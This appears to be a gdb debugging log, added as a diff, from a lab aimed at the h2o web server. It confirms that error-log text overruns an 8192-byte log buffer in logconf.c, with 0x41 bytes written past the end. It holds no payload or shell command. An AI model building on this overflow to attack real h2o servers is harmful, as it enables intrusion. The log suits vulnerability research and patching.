@@ -1,0 +1,38 @@
+REQUEST_FAILED <HTTPError 503: 'Internal Server Error'>
+Breakpoint 1 at 0xdaf76: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/core/logconf.c, line 843.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Warning: failed to load the default certificates file at /usr/local/share/h2o/ca-bundle.crt. Proxying to HTTPS servers may fail.
+[INFO] raised RLIMIT_NOFILE to 1048576
+[Detaching after fork from child process 1911807]
+[New Thread 0x7ffff73ff6c0 (LWP 1911808)]
+
+Thread 1 "h2o" hit Breakpoint 1, h2o_log_request (logconf=0x5555557c3dc0, req=0x555555792d08, len=0x7fffffffc820, buf=0x7fffffffc840 "(\264|UUU") at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/core/logconf.c:843
+843	                pos = append_unsafe_string(pos, req->error_logs->bytes, req->error_logs->size);
+AT_843 LINE=0x5555557d4740 LINE_END=0x5555557d6740 CAP=8192 ERROR_SIZE=7007
+0x000055555563cbe2 in log_access (_self=0x5555557c41b0, req=0x555555792d08) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/handler/access_log.c:53
+53	    logline = h2o_log_request(fh->logconf, req, &len, buf);
+Value returned is $1 = 0x5555557d4740 'B' <repeats 200 times>...
+AFTER_RETURN LEN=8209
+0x5555557d6740:	0x4141414141414141	0x4141414141414141
+0x5555557d6750:	0x000000000000000a	0x0000000000000000
+0x5555557d6760:	0x0000000000000000	0x0000000000000000
+0x5555557d6770:	0x0000000000000000	0x0000000000000000
+0x5555557d6780:	0x0000000000000000	0x0000000000000000
+0x5555557d6790:	0x0000000000000000	0x0000000000000000
+0x5555557d67a0:	0x0000000000000000	0x0000000000000000
+0x5555557d67b0:	0x0000000000000000	0x0000000000000000
+0x5555557d67c0:	0x0000000000000000	0x0000000000000000
+0x5555557d67d0:	0x0000000000000000	0x0000000000000000
+0x5555557d67e0:	0x0000000000000000	0x0000000000000000
+0x5555557d67f0:	0x0000000000000000	0x0000000000000000
+0x5555557d6800:	0x0000000000000000	0x0000000000000000
+0x5555557d6810:	0x0000000000000000	0x0000000000000000
+0x5555557d6820:	0x0000000000000000	0x0000000000000000
+0x5555557d6830:	0x0000000000000000	0x0000000000000000
+0x5555557d6740:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x5555557d6748:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+#0  0x000055555563cbe2 in log_access (_self=0x5555557c41b0, req=0x555555792d08) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/handler/access_log.c:53
+#1  0x0000555555636c98 in h2o_dispose_request (req=0x555555792d08) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/core/request.c:334
+#2  0x0000555555662843 in close_connection (conn=0x555555792bb0, close_socket=1) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell/src/vuln/lib/http1.c:144
+
